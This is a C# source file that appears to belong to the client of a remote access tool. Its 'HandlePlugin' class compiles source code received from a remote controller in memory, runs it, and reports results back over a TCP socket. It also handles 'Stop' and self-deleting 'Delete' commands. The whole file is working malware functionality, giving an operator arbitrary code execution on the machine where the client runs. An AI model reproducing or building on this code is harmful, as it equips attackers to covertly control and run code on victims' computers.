using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using MessagePack;
using Microsoft.CSharp;

namespace Client.HandlePacket
{
    internal class HandlePlugin
    {
        public static void PluginLoad(string source, string[] referencedAssemblies,
            string Controler_HWID)
        {
            try
            {
                var assembly = Compiler(referencedAssemblies, source, Controler_HWID);
                if (assembly == null) return;
                var result = new string[] { };

                foreach (var type in assembly.GetTypes())
                    foreach (var method in type.GetMethods())
                        if (method.Name.ToLower().Equals("pluginMain".ToLower()))
                            result = (string[])method.Invoke(null, new object[] { new[] { Program.Mutex } });
                if (result == null) return;
                switch (result[0])
                {
                    case "Null":
                        {
                            return;
                        }

                    case "Stop":
                        {
                            HandleOption.Stop();
                            return;
                        }

                    case "Delete":
                        {
                            HandleOption.DeleteSelf();
                            HandleOption.Stop();
                            return;
                        }

                    default:
                        {
                            var msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = result[0];
                            msgpack.ForcePathObject("Controler_HWID").AsString = Controler_HWID;
                            msgpack.ForcePathObject("Message").AsString = result[1];
                            Program.TCP_Socket.Send(msgpack.Encode2Bytes());
                            return;
                        }
                }
            }
            catch (Exception ex)
            {
                Program.TCP_Socket.Log(Controler_HWID, ex.Message);
            }
        }

        public static Assembly Compiler(string[] referencedAssemblies, string sourceCode, string Controler_HWID)
        {
            var providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v4.0" } };

            var assms = AppDomain.CurrentDomain.GetAssemblies();
            foreach (var assmble in assms)
            {
                var assembleName = assmble.GetName();
                if (assembleName.Name == "mscorlib" && assembleName.Version.Major == 2)
                    providerOptions = new Dictionary<string, string> { { "CompilerVersion", "v3.5" } };
            }

            var compilerOptions = "/platform:anycpu /optimize+";

            using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
            {
                var compilerParameters = new CompilerParameters(referencedAssemblies)
                {
                    GenerateExecutable = false,
                    GenerateInMemory = true,
                    CompilerOptions = compilerOptions,
                    TreatWarningsAsErrors = false,
                    IncludeDebugInformation = false
                };

                var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, sourceCode);
                if (compilerResults.Errors.Count > 0)
                {
                    StringBuilder sb = new StringBuilder();
                    foreach (CompilerError compilerError in compilerResults.Errors)
                        sb.AppendLine(
                            $"{compilerError.ErrorText}\nLine: {compilerError.Line} - Column: {compilerError.Column}\nFile: {compilerError.FileName}");
                    Program.TCP_Socket.Log(Controler_HWID,sb.ToString());
                    return null;
                }

                var assembly = compilerResults.CompiledAssembly;
                return assembly;
            }
        }
    }
}